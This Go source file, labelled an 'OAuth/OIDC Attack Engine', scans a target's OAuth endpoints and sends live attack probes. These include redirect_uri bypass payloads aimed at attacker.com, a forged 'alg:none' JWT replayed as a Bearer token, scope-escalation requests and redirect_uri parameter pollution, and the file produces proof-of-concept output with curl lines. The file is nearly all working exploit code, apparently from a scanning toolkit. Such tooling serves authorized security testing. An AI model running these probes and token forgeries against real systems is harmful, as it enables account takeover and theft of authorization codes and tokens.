// oauth.go — Advanced OAuth/OIDC Attack Engine
// Detects and exploits OAuth 2.0 / OpenID Connect misconfigurations.
// Covers: state parameter bypass, open redirect chains, PKCE downgrade,
// token leakage, implicit flow abuse, JWT confusion, SSO bypass.
package brain

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// OAuthFinding represents a discovered OAuth vulnerability.
type OAuthFinding struct {
	Type        string // "missing_state", "open_redirect", "token_leak", "pkce_downgrade", etc.
	Severity    string // "critical", "high", "medium", "low"
	URL         string
	Description string
	Evidence    string
	PoC         string
	Impact      string
}

// OAuthAnalysisResult holds all OAuth findings for a target.
type OAuthAnalysisResult struct {
	Target       string
	Findings     []OAuthFinding
	AuthURLs     []string // discovered OAuth authorization endpoints
	TokenURLs    []string // discovered token endpoints
	CallbackURLs []string // discovered redirect_uri endpoints
	JWTTokens    []string // captured JWT tokens
	Duration     time.Duration
}

var oauthClient = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	// Do NOT follow redirects — we need to inspect them
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// ─── OAuth Endpoint Discovery ─────────────────────────────────────────────────

// DiscoverOAuthEndpoints finds OAuth/OIDC endpoints on a target.
func DiscoverOAuthEndpoints(target string) (authURLs, tokenURLs, callbackURLs []string) {
	base := "https://" + strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")

	authPaths := []string{
		"/oauth/authorize", "/oauth2/authorize", "/auth/oauth/authorize",
		"/connect/authorize", "/openid/authorize", "/sso/authorize",
		"/api/oauth/authorize", "/v1/oauth/authorize", "/v2/oauth/authorize",
		"/.well-known/openid-configuration", "/oauth/.well-known/openid-configuration",
		"/auth", "/login", "/signin", "/sso", "/saml/sso",
	}
	tokenPaths := []string{
		"/oauth/token", "/oauth2/token", "/connect/token",
		"/api/oauth/token", "/v1/oauth/token", "/auth/token",
	}
	callbackPaths := []string{
		"/oauth/callback", "/oauth2/callback", "/auth/callback",
		"/callback", "/redirect", "/oauth/redirect",
		"/api/auth/callback", "/login/callback",
	}

	var mu sync.Mutex
	var wg sync.WaitGroup

	check := func(path string, dest *[]string) {
		defer wg.Done()
		resp, err := oauthClient.Get(base + path)
		if err != nil {
			return
		}
		resp.Body.Close()
		if resp.StatusCode < 500 {
			mu.Lock()
			*dest = append(*dest, base+path)
			mu.Unlock()
		}
	}

	for _, p := range authPaths {
		wg.Add(1)
		go check(p, &authURLs)
	}
	for _, p := range tokenPaths {
		wg.Add(1)
		go check(p, &tokenURLs)
	}
	for _, p := range callbackPaths {
		wg.Add(1)
		go check(p, &callbackURLs)
	}
	wg.Wait()
	return
}

// ─── Attack 1: Missing State Parameter ───────────────────────────────────────

// CheckMissingState tests if OAuth flow is vulnerable to CSRF via missing state.
func CheckMissingState(authURL string) *OAuthFinding {
	params := url.Values{
		"response_type": {"code"},
		"client_id":     {"test_client"},
		"redirect_uri":  {"https://attacker.com/callback"},
		"scope":         {"openid profile email"},
	}
	testURL := authURL + "?" + params.Encode()

	resp, err := oauthClient.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
	bodyStr := string(body)

	if resp.StatusCode == 200 || resp.StatusCode == 302 {
		if !strings.Contains(strings.ToLower(bodyStr), "state") &&
			!strings.Contains(strings.ToLower(bodyStr), "invalid") &&
			!strings.Contains(strings.ToLower(bodyStr), "required") {
			return &OAuthFinding{
				Type:        "missing_state_csrf",
				Severity:    "high",
				URL:         testURL,
				Description: "OAuth authorization endpoint accepts requests without state parameter",
				Evidence:    fmt.Sprintf("HTTP %d — no state validation error", resp.StatusCode),
				PoC:         fmt.Sprintf("GET %s\n# No state parameter — CSRF attack possible", testURL),
				Impact:      "Attacker can forge OAuth requests, leading to account takeover via CSRF",
			}
		}
	}
	return nil
}

// ─── Attack 2: Open Redirect in redirect_uri ─────────────────────────────────

// CheckOpenRedirectURI tests for open redirect via redirect_uri manipulation.
func CheckOpenRedirectURI(authURL string) *OAuthFinding {
	bypassPayloads := []struct {
		uri    string
		reason string
	}{
		{"https://attacker.com", "direct external domain"},
		{"https://attacker.com/callback", "external with path"},
		{"https://legitimate.com.attacker.com", "subdomain confusion"},
		{"https://legitimate.com@attacker.com", "@ bypass"},
		{"https://legitimate.com%2F@attacker.com", "URL-encoded slash"},
		{"https://attacker.com%23legitimate.com", "fragment bypass"},
		{"//attacker.com", "protocol-relative"},
		{"https://attacker.com?legitimate.com", "query confusion"},
	}

	for _, payload := range bypassPayloads {
		params := url.Values{
			"response_type": {"code"},
			"client_id":     {"test_client"},
			"redirect_uri":  {payload.uri},
			"state":         {"test_state_12345"},
			"scope":         {"openid"},
		}
		testURL := authURL + "?" + params.Encode()

		resp, err := oauthClient.Get(testURL)
		if err != nil {
			continue
		}
		resp.Body.Close()

		location := resp.Header.Get("Location")
		if location != "" && strings.Contains(location, "attacker.com") {
			return &OAuthFinding{
				Type:        "open_redirect_uri",
				Severity:    "critical",
				URL:         testURL,
				Description: fmt.Sprintf("OAuth redirect_uri accepts external domains (%s)", payload.reason),
				Evidence:    fmt.Sprintf("Location: %s", location),
				PoC: fmt.Sprintf(
					"# OAuth Open Redirect — Token Theft\nGET %s\n# Server redirects to: %s\n# Authorization code leaked to attacker",
					testURL, location),
				Impact: "Authorization codes and tokens leaked to attacker-controlled server",
			}
		}
	}
	return nil
}

// ─── Attack 3: PKCE Downgrade Attack ─────────────────────────────────────────

// CheckPKCEDowngrade tests if PKCE can be bypassed.
func CheckPKCEDowngrade(authURL string) *OAuthFinding {
	params := url.Values{
		"response_type": {"code"},
		"client_id":     {"test_client"},
		"redirect_uri":  {"https://localhost/callback"},
		"state":         {"test_state"},
		"scope":         {"openid"},
	}
	testURL := authURL + "?" + params.Encode()

	resp, err := oauthClient.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
	bodyStr := string(body)

	if resp.StatusCode != 400 &&
		!strings.Contains(strings.ToLower(bodyStr), "code_challenge") &&
		!strings.Contains(strings.ToLower(bodyStr), "pkce") {
		return &OAuthFinding{
			Type:        "pkce_not_enforced",
			Severity:    "high",
			URL:         testURL,
			Description: "OAuth server does not enforce PKCE for public clients",
			Evidence:    fmt.Sprintf("HTTP %d — no PKCE requirement error", resp.StatusCode),
			PoC: fmt.Sprintf(
				"# PKCE Downgrade — Authorization Code Interception\nGET %s\n# No code_challenge required",
				testURL),
			Impact: "Authorization codes can be intercepted and exchanged without PKCE verification",
		}
	}

	// Test implicit flow
	params2 := url.Values{
		"response_type": {"token"},
		"client_id":     {"test_client"},
		"redirect_uri":  {"https://localhost/callback"},
		"state":         {"test_state"},
		"scope":         {"openid"},
	}
	testURL2 := authURL + "?" + params2.Encode()
	resp2, err := oauthClient.Get(testURL2)
	if err != nil {
		return nil
	}
	defer resp2.Body.Close()

	if resp2.StatusCode == 200 || resp2.StatusCode == 302 {
		location := resp2.Header.Get("Location")
		if strings.Contains(location, "access_token=") {
			return &OAuthFinding{
				Type:        "implicit_flow_enabled",
				Severity:    "high",
				URL:         testURL2,
				Description: "OAuth implicit flow is enabled (deprecated, insecure)",
				Evidence:    fmt.Sprintf("Location contains access_token: %s", truncateSecret(location)),
				PoC: fmt.Sprintf(
					"# Implicit Flow Token Theft\nGET %s\n# Token returned in URL fragment",
					testURL2),
				Impact: "Access tokens exposed in URL fragments, browser history, and server logs",
			}
		}
	}
	return nil
}

// ─── Attack 4: Token Leakage via Referrer ────────────────────────────────────

// CheckTokenLeakage tests for token leakage in HTTP headers and logs.
func CheckTokenLeakage(callbackURL string) *OAuthFinding {
	testURL := callbackURL + "#access_token=eyJhbGciOiJSUzI1NiJ9.test.signature&token_type=bearer"

	resp, err := oauthClient.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
	bodyStr := string(body)

	if strings.Contains(bodyStr, "access_token") || strings.Contains(bodyStr, "eyJhbGci") {
		return &OAuthFinding{
			Type:        "token_reflection",
			Severity:    "medium",
			URL:         testURL,
			Description: "OAuth callback reflects token values in response body",
			Evidence:    "access_token value reflected in response",
			PoC: fmt.Sprintf(
				"# Token Reflection — Potential Log Exposure\nGET %s\n# Token reflected in response",
				testURL),
			Impact: "Access tokens may be captured in server logs, analytics, or error reports",
		}
	}
	return nil
}

// ─── Attack 5: JWT Algorithm Confusion ───────────────────────────────────────

// CheckJWTAlgorithmConfusion tests for JWT algorithm confusion attacks.
func CheckJWTAlgorithmConfusion(tokenURL string, capturedJWT string) *OAuthFinding {
	if capturedJWT == "" {
		return nil
	}

	parts := strings.Split(capturedJWT, ".")
	if len(parts) != 3 {
		return nil
	}

	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil
	}
	headerJSON := string(headerBytes)

	if strings.Contains(headerJSON, `"RS256"`) || strings.Contains(headerJSON, `"RS384"`) ||
		strings.Contains(headerJSON, `"RS512"`) {
		noneHeaderJSON := `{"alg":"none","typ":"JWT"}`
		noneHeader := base64.RawURLEncoding.EncodeToString([]byte(noneHeaderJSON))
		forgedToken := noneHeader + "." + parts[1] + "."

		req, err := http.NewRequest("GET", tokenURL, nil)
		if err != nil {
			return nil
		}
		req.Header.Set("Authorization", "Bearer "+forgedToken)

		resp, err := oauthClient.Do(req)
		if err != nil {
			return nil
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			return &OAuthFinding{
				Type:        "jwt_alg_none",
				Severity:    "critical",
				URL:         tokenURL,
				Description: "JWT accepts 'none' algorithm — signature verification bypassed",
				Evidence:    fmt.Sprintf("HTTP 200 with alg:none token at %s", tokenURL),
				PoC: fmt.Sprintf(
					"# JWT Algorithm Confusion — Signature Bypass\n# Forged token (alg:none): %s\ncurl -H 'Authorization: Bearer %s' %s",
					forgedToken, forgedToken, tokenURL),
				Impact: "Complete authentication bypass — attacker can forge any JWT claims",
			}
		}
	}
	return nil
}

// ─── Attack 6: OAuth State Fixation ──────────────────────────────────────────

// CheckStateFixation tests if the OAuth state parameter can be fixed by attacker.
func CheckStateFixation(authURL, callbackURL string) *OAuthFinding {
	attackerState := "ATTACKER_CONTROLLED_STATE_12345"

	params := url.Values{
		"response_type": {"code"},
		"client_id":     {"test_client"},
		"redirect_uri":  {callbackURL},
		"state":         {attackerState},
		"scope":         {"openid"},
	}
	testURL := authURL + "?" + params.Encode()

	resp, err := oauthClient.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	location := resp.Header.Get("Location")
	if strings.Contains(location, attackerState) {
		return &OAuthFinding{
			Type:        "state_fixation",
			Severity:    "medium",
			URL:         testURL,
			Description: "OAuth state parameter is reflected without server-side validation",
			Evidence:    fmt.Sprintf("State reflected in redirect: %s", location),
			PoC: fmt.Sprintf(
				"# OAuth State Fixation\n# Attacker initiates OAuth with fixed state: %s\n# Victim completes flow — attacker's state accepted",
				attackerState),
			Impact: "CSRF attack possible if state is not properly validated server-side",
		}
	}
	return nil
}

// ─── Attack 7: Scope Escalation ──────────────────────────────────────────────

// CheckScopeEscalation tests if additional scopes can be requested beyond what's allowed.
func CheckScopeEscalation(authURL string) *OAuthFinding {
	privilegedScopes := []string{
		"admin", "write:admin", "user:admin", "scope:all",
		"openid profile email admin offline_access",
		"read:all write:all delete:all",
	}

	for _, scope := range privilegedScopes {
		params := url.Values{
			"response_type": {"code"},
			"client_id":     {"test_client"},
			"redirect_uri":  {"https://localhost/callback"},
			"state":         {"test_state"},
			"scope":         {scope},
		}
		testURL := authURL + "?" + params.Encode()

		resp, err := oauthClient.Get(testURL)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			return &OAuthFinding{
				Type:        "scope_escalation",
				Severity:    "high",
				URL:         testURL,
				Description: fmt.Sprintf("OAuth server accepts privileged scope: %q", scope),
				Evidence:    fmt.Sprintf("HTTP %d for scope=%s", resp.StatusCode, scope),
				PoC: fmt.Sprintf(
					"# OAuth Scope Escalation\nGET %s\n# Privileged scope accepted",
					testURL),
				Impact: "Attacker may obtain tokens with elevated privileges beyond intended scope",
			}
		}
	}
	return nil
}

// ─── Attack 8: SSO Bypass via Parameter Pollution ────────────────────────────

// CheckSSOBypass tests for SSO bypass via HTTP parameter pollution.
func CheckSSOBypass(authURL string) *OAuthFinding {
	testURL := authURL + "?response_type=code&client_id=legit&redirect_uri=https://legit.com/cb" +
		"&redirect_uri=https://attacker.com/cb&state=test&scope=openid"

	resp, err := oauthClient.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	location := resp.Header.Get("Location")
	if strings.Contains(location, "attacker.com") {
		return &OAuthFinding{
			Type:        "sso_parameter_pollution",
			Severity:    "critical",
			URL:         testURL,
			Description: "OAuth SSO vulnerable to HTTP parameter pollution in redirect_uri",
			Evidence:    fmt.Sprintf("Redirected to attacker URL: %s", location),
			PoC: fmt.Sprintf(
				"# SSO Bypass via Parameter Pollution\nGET %s\n# Server uses last redirect_uri — attacker's URL wins",
				testURL),
			Impact: "Complete account takeover — authorization codes sent to attacker",
		}
	}
	return nil
}

// ─── Main Analysis Function ───────────────────────────────────────────────────

// AnalyzeOAuthFlows performs comprehensive OAuth security analysis on a target.
func AnalyzeOAuthFlows(target string, liveURLs []string) OAuthAnalysisResult {
	start := time.Now()
	result := OAuthAnalysisResult{Target: target}

	authURLs, tokenURLs, callbackURLs := DiscoverOAuthEndpoints(target)
	result.AuthURLs = authURLs
	result.TokenURLs = tokenURLs
	result.CallbackURLs = callbackURLs

	// Also extract OAuth URLs from live URLs
	for _, u := range liveURLs {
		lower := strings.ToLower(u)
		if strings.Contains(lower, "authorize") {
			authURLs = append(authURLs, u)
		} else if strings.Contains(lower, "/token") {
			tokenURLs = append(tokenURLs, u)
		} else if strings.Contains(lower, "callback") {
			callbackURLs = append(callbackURLs, u)
		}
	}

	result.JWTTokens = extractJWTsFromURLs(liveURLs)

	var mu sync.Mutex
	var wg sync.WaitGroup

	addFinding := func(f *OAuthFinding) {
		if f != nil {
			mu.Lock()
			result.Findings = append(result.Findings, *f)
			mu.Unlock()
		}
	}

	for _, authURL := range authURLs {
		au := authURL
		wg.Add(4)
		go func() { defer wg.Done(); addFinding(CheckMissingState(au)) }()
		go func() { defer wg.Done(); addFinding(CheckOpenRedirectURI(au)) }()
		go func() { defer wg.Done(); addFinding(CheckPKCEDowngrade(au)) }()
		go func() { defer wg.Done(); addFinding(CheckScopeEscalation(au)) }()

		for _, cbURL := range callbackURLs {
			cb := cbURL
			wg.Add(1)
			go func() { defer wg.Done(); addFinding(CheckStateFixation(au, cb)) }()
		}

		wg.Add(1)
		go func() { defer wg.Done(); addFinding(CheckSSOBypass(au)) }()
	}

	for _, tokenURL := range tokenURLs {
		tu := tokenURL
		wg.Add(1)
		go func() { defer wg.Done(); addFinding(CheckCodeReuse(tu)) }()

		for _, jwt := range result.JWTTokens {
			j := jwt
			wg.Add(1)
			go func() { defer wg.Done(); addFinding(CheckJWTAlgorithmConfusion(tu, j)) }()
		}
	}

	for _, cbURL := range callbackURLs {
		cb := cbURL
		wg.Add(1)
		go func() { defer wg.Done(); addFinding(CheckTokenLeakage(cb)) }()
	}

	wg.Wait()
	result.Duration = time.Since(start)
	return result
}

// CheckCodeReuse tests token endpoint error message behavior.
func CheckCodeReuse(tokenURL string) *OAuthFinding {
	params := url.Values{
		"grant_type":   {"authorization_code"},
		"code":         {"EXPIRED_OR_USED_CODE_12345"},
		"redirect_uri": {"https://localhost/callback"},
		"client_id":    {"test_client"},
	}

	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(params.Encode()))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := oauthClient.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	bodyStr := string(body)

	if strings.Contains(bodyStr, "user_id") || strings.Contains(bodyStr, "email") ||
		strings.Contains(bodyStr, "username") {
		return &OAuthFinding{
			Type:        "error_info_disclosure",
			Severity:    "medium",
			URL:         tokenURL,
			Description: "OAuth token endpoint leaks user information in error responses",
			Evidence:    fmt.Sprintf("Error response contains PII: %s", truncateSecret(bodyStr)),
			PoC: fmt.Sprintf(
				"# OAuth Error Information Disclosure\nPOST %s\ngrant_type=authorization_code&code=INVALID&...",
				tokenURL),
			Impact: "User information exposed in error responses — privacy violation",
		}
	}
	return nil
}

// FormatOAuthReport returns a human-readable OAuth analysis report.
func FormatOAuthReport(result OAuthAnalysisResult) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("\n  🔐 OAuth/OIDC Analysis — %s\n", result.Target))
	sb.WriteString(fmt.Sprintf("  Duration: %s\n", result.Duration.Round(time.Second)))
	sb.WriteString(fmt.Sprintf("  Auth endpoints: %d | Token endpoints: %d | Callbacks: %d\n",
		len(result.AuthURLs), len(result.TokenURLs), len(result.CallbackURLs)))

	if len(result.Findings) == 0 {
		sb.WriteString("  No OAuth vulnerabilities found.\n")
		return sb.String()
	}

	sb.WriteString(fmt.Sprintf("\n  🚨 %d OAuth vulnerabilities found:\n\n", len(result.Findings)))
	for i, f := range result.Findings {
		sb.WriteString(fmt.Sprintf("  [%d] [%s] %s\n", i+1, strings.ToUpper(f.Severity), f.Type))
		sb.WriteString(fmt.Sprintf("      URL: %s\n", f.URL))
		sb.WriteString(fmt.Sprintf("      %s\n", f.Description))
		sb.WriteString(fmt.Sprintf("      Impact: %s\n\n", f.Impact))
	}
	return sb.String()
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

var jwtPattern = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`)

func extractJWTsFromURLs(urls []string) []string {
	var jwts []string
	seen := make(map[string]bool)
	for _, u := range urls {
		matches := jwtPattern.FindAllString(u, -1)
		for _, m := range matches {
			if !seen[m] {
				seen[m] = true
				jwts = append(jwts, m)
			}
		}
	}
	return jwts
}
	